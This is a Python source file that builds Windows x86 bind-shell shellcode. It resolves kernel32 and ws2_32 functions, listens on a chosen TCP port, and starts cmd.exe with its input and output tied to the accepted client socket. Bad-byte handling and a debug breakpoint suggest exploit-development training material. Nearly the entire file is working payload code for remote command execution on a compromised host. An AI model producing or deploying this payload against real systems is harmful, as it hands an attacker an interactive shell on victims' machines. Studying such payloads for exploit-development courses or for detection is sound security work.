"""Bind-shell payload builder."""

from shellcode.payload_utils import (
    flatten_asm,
    format_shellcode_asm,
    to_network_endpoint_bytes,
)
from shellcode.shellcode_helper import ShellcodeHelper


def bind_shellcode(bind_port, breakpoint=0, bad_bytes=None):
    # This helper class manages the function pointers and variables needed in shellcode
    # it reserves space on the stack starting at [EBP-0x04] and grows upward to lower addresses
    # meaning the second variable allocated is at [EBP-0x08]
    # The helper class already allocates variables needed in the boilerplate code:
    #  - the function pointer to `find_function`, a variable `common_temp`
    #    and the function pointer to `LoadLibraryA` from kernel32.dll
    var = ShellcodeHelper(bad_bytes=bad_bytes)

    # These are the names of the function calls the shellcode will be calling
    # Start them with `f_` to keep the function calls clear from `v_` variables
    # If they are not written exactly correct, the find_function will not be able to locate them
    f_term_process = "TerminateProcess" # in `kernel32.dll`
    f_create_process = "CreateProcessA" # in `kernel32.dll`

    f_wsastartup = "WSAStartup"   # in `ws2_32.dll`
    f_wsasocketa = "WSASocketA"   # in `ws2_32.dll`
    f_bind = "bind"               # in `ws2_32.dll`
    f_listen = "listen"           # in `ws2_32.dll`
    f_accept = "accept"           # in `ws2_32.dll`

    # Reserve space on the stack for the function calls with the helper class
    for function_name in (
        f_term_process,
        f_create_process,
        f_wsastartup,
        f_wsasocketa,
        f_bind,
        f_listen,
        f_accept,
    ):
        var.add(function_name)

    # These are the variables needed in different function calls

    # this variable is an out variable in the WSAStartup
    # dont need the result, but guarantee a safe, writeable area
    v_lp_wsa_data = "lpWSAData"
    var.add(v_lp_wsa_data, reserve=0x190)   # reserves 0x190 bytes

    # this variable is for saving the socket returned by ws2_32!WSASocketA
    v_socket = "socket"
    var.add(v_socket)                     # reserves 0x04 bytes under the name "socket"

    # this variable is for saving the client socket returned by ws2_32!Accept
    v_client_socket = "client_socket"
    var.add(v_client_socket)              # reserves 0x04 bytes

    # this variable is for the struct needed in bind
    v_sockaddr_in = "sockaddr_in"
    var.add(v_sockaddr_in, reserve=0x10)  # reserves 0x10 bytes

    # this variable is for the lpStartupInfo needed in CreateProcessA
    v_lp_startup_info = "lpStartupInfo"
    var.add(v_lp_startup_info, reserve=0x44) # reserves 0x44 bytes

    # this variable is an out variable in the CreateProcessA
    # dont need the result, but guarantee a safe, writeable area
    v_lp_proc_info = "lpProcessInformation"
    var.add(v_lp_proc_info, reserve=0x20)    # reserves 0x20 bytes

    # this variable is a 16-byte block to write `cmd.exe` used in CreateProcessA
    v_str_cmd_exe = "str_cmd_exe"
    var.add(v_str_cmd_exe, reserve=0x10)  # reserves 0x10 bytes, we will put the string "cmd.exe" here

    # done adding variables!
    # if you want to see the reserved variable layout, uncomment the next line:
    # var.print_variables()

    # prepare the sockaddr_in structure needed in `bind`
    #  struct sockaddr_in {
    #    short   sin_family;
    #    u_short sin_port;
    #    struct  in_addr sin_addr;
    #    char    sin_zero[8];
    #  };
    sin_family = 0x02 # AF_INET
    sin_addr_bytes, sin_port_bytes = to_network_endpoint_bytes("0.0.0.0", bind_port)

    sockaddr_in_data = int.to_bytes(sin_family, 2, "little") # 2 bytes sin_family
    sockaddr_in_data += sin_port_bytes # 2 bytes sin_port
    sockaddr_in_data += sin_addr_bytes # 4 bytes sin_addr 0.0.0.0, this can also be left out in the case of 0.0.0.0
    # we ignore the sin_zero because 0s are taken care of in function get_clear_variables()

    asm = [
        "start:",
        f"{['', 'int3;'][breakpoint]}",
        var.get_esp_setup(),                    # reserve scratch space for variables and temporary structures
        var.get_clear_variables(),              # zero the stack-backed variable area
        var.get_common_shellcode(),             # locate kernel32 and bootstrap resolver helpers

        # Directly after the common shellcode, the find function routine will look in kernel32.dll until the
        # next library is loaded
        # resolve the CreateProcessA and TerminateProcess addresses from kernel32
        "   resolve_symbols_kernel32: ",
        var.find_function(f_term_process),
        var.find_function(f_create_process),

        # Load the ws2_32.dll library to find and save the function pointers for the bind shellcode
        "   load_ws2_32:                         ",
        var.load_library("ws2_32.dll"),

        "   resolve_symbols_ws2_32:              ",
        var.find_function(f_wsastartup),
        var.find_function(f_wsasocketa),
        var.find_function(f_bind),
        var.find_function(f_listen),
        var.find_function(f_accept),
        # At this point, all needed functions are found and saved to their respective variables

        # Continue with the shellcode:

        # int WSAStartup(
        #  [in]  WORD      wVersionRequired,
        #  [out] LPWSADATA lpWSAData);
        "   call_wsastartup:                    ",
        var.push_var_address(v_lp_wsa_data),        # lpWSAData: push the reserved variable address of the lpWSAData structure
        "       xor eax, eax                    ;",
        "       mov ax, 0x0202                  ;",
        "       push eax                        ;", # wVersionRequired: initialize winsock with version 2.2
        var.call_function(f_wsastartup),            # call WSAStartup, ignore return value in EAX

        # SOCKET WSAAPI WSASocketA(
        #  [in] int                 af,
        #  [in] int                 type,
        #  [in] int                 protocol,
        #  [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,
        #  [in] GROUP               g,
        #  [in] DWORD               dwFlags);
        "   call_wsasocketa:                     ", # create a TCP socket for the listening endpoint
        "       xor eax, eax                    ;",
        "       push eax                        ;", # dwFlags: NULL
        "       push eax                        ;", # g: NULL
        "       push eax                        ;", # lpProtocolInfo: NULL
        "       mov al, 0x06                    ;", #
        "       push eax                        ;", # protocol: 0x06 (IPPROTO_TCP)
        "       sub al, 0x05                    ;", #
        "       push eax                        ;", # type: 0x01 (SOCK_STREAM)
        "       inc eax                         ;", #
        "       push eax                        ;", # af: 0x02 (AF_INET)
        var.call_function(f_wsasocketa),            # call WSASocketA
        var.write_var(v_socket, "eax"),             # save the returned socket in EAX to the variable socket

        "   set_data_of_sockin:                     ",
        var.set_variable_data(v_sockaddr_in, sockaddr_in_data), # copy the prepared sockaddr_in_data into the variable

        # int WSAAPI bind(
        #  [in] SOCKET         s,
        #  [in] const sockaddr *name,
        #  [in] int            namelen);
        "   call_bind:                           ",  # bind the socket to 0.0.0.0:bind_port
        "       xor eax, eax                    ;",
        "       add al, 0x10                    ;",
        "       push eax                        ;", # namelen: 0x10
        var.push_var_address(v_sockaddr_in),        # name: address of the variable v_sockaddr_in
        var.push_var_value(v_socket),               # s: value of socket as returned by WSASocketA
        var.call_function(f_bind),

        # int WSAAPI listen(
        #  [in] SOCKET s,
        #  [in] int    backlog);
        "   call_listen:                         ",
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;", # backlog = 0x00, backlog is left at zero for a single client
        var.push_var_value(v_socket),               # s: value of socket as returned by WSASocketA
        var.call_function(f_listen),                # call Listen

        # SOCKET WSAAPI accept(
        #  [in]      SOCKET   s,
        #  [out]     sockaddr *addr,
        #  [in, out] int      *addrlen);
        "   call_accept:                         ",  # block until a client connects, then keep the accepted socket
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;", # addrlen: NULL
        "       push ecx                        ;", # addr: NULL
        var.push_var_value(v_socket),               # s: value of socket as returned by WSASocketA
        var.call_function(f_accept),                # call Accept
        var.write_var(v_client_socket, "eax"),      # return value of Accept is an accepted client socket.
        # we will route stdio for cmd.exe in and out of this accepted client socket

        # Prepare the values in the lpStartupInfo struct needed in CreateProcessA
        # see https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
        "   create_startupinfoa:                 ",
        "       xor eax, eax                    ;",
        "       mov al, 0x44                    ;",
        var.write_var(v_lp_startup_info, "eax", 0x00), # write cb offset, sizeof(STARTUPINFOA), EAX=0x44
        "       add al, 0xBB                    ;",    # EAX=0xFF
        "       inc eax                         ;",    # EAX=0x100
        var.write_var(v_lp_startup_info, "eax", 0x2C), # write dwFlags offset, EAX=0x100

        var.read_var(v_client_socket, "eax"),          # move the client socket into EAX
        var.write_var(v_lp_startup_info, "eax", 0x38), # write hStdInput offset with client socket from EAX
        var.write_var(v_lp_startup_info, "eax", 0x3C), # write hStdOutput offset with client socket from EAX
        var.write_var(v_lp_startup_info, "eax", 0x40), # write hStdError offset with client socket from EAX

        "   create_cmd_string:                   ",
        var.set_variable_data(v_str_cmd_exe, b"cmd.exe"), # write `cmd.exe` into the v_str_cmd_exe variable location

        #  BOOL CreateProcessA(
        #  [in, optional]      LPCSTR                lpApplicationName,
        #  [in, out, optional] LPSTR                 lpCommandLine,
        #  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
        #  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
        #  [in]                BOOL                  bInheritHandles,
        #  [in]                DWORD                 dwCreationFlags,
        #  [in, optional]      LPVOID                lpEnvironment,
        #  [in, optional]      LPCSTR                lpCurrentDirectory,
        #  [in]                LPSTARTUPINFOA        lpStartupInfo,
        #  [out]               LPPROCESS_INFORMATION lpProcessInformation);
        "   call_createprocessa:                 ",
        var.push_var_address(v_lp_proc_info),       # lpProcessInformation: push the address of v_lp_proc_info
        var.push_var_address(v_lp_startup_info),    # lpStartupInfo: push the address of the v_lp_startup_info we filled above
        "       xor eax, eax                    ;",
        "       push eax                        ;", # lpCurrentDirectory: NULL
        "       push eax                        ;", # lpEnvironment: NULL
        "       push eax                        ;", # dwCreationFlags: NULL
        "       inc eax                         ;",
        "       push eax                        ;", # bInheritHandles = TRUE
        "       dec eax                         ;",
        "       push eax                        ;", # lpThreadAttributes: NULL
        "       push eax                        ;", # lpProcessAttributes: NULL
        var.push_var_address(v_str_cmd_exe, "ebx"), # lpCommandLine: push the address of v_str_cmd_exe (contains "cmd.exe"), use EBX as throw away reg
        "       push eax                        ;", # lpApplicationName: NULL
        var.call_function(f_create_process),        # Call CreateProcessA, returns a bool in EAX, but don't care...

        #  BOOL TerminateProcess(
        #  [in] HANDLE hProcess,
        #  [in] UINT   uExitCode);
        "   exec_shellcode:                      ",  # terminate the original thread/process context after the child is created
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;",  # uExitCode = 0
        "       push 0xffffffff                 ;",  # hProcess = -1, Pseudohandle to current process
        var.call_function(f_term_process),           # Call TerminateProcess
    ]
    return format_shellcode_asm("\n".join(flatten_asm(asm)))
